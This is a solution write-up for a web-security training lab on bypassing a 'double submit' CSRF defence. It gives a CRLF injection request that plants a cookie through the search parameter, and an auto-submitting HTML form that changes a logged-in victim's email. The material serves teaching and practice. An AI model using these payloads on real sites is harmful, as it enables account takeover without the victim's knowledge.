This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter 

# Solution

Cookie Setting vulnerability at /search
Exploit /search to Set-Cookie
```http
GET /?search=test%0d%0aSet-Cookie:%20csrfKey=KEY%3b%20SameSite=None HTTP/2
Host: 0ae400b90394293180c40db000050085.web-security-academy.net
```

Response
```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=KEY; SameSite=None; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3460
```

CSRF validation requirements:
- Cookie: csrf and form's csrf value must be the same
- CSRF token value can be arbitrary as server doesn't seem to check against a valid pool

```html
<form id="autosubmit" action="https://0a63000c0441b35880cb6759000500c7.web-security-academy.net/my-account/change-email" enctype="application/x-www-form-urlencoded" method="POST">
 <input name="email" type="hidden" value="some-other-email@attacker.com" />
 <input type="hidden" name="csrf" value="forgedToken">
 <input type="submit" value="Submit Request" />
</form>

<img src="https://0a63000c0441b35880cb6759000500c7.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=forgedToken%3b%20SameSite=None" onerror="document.forms[0].submit()">
```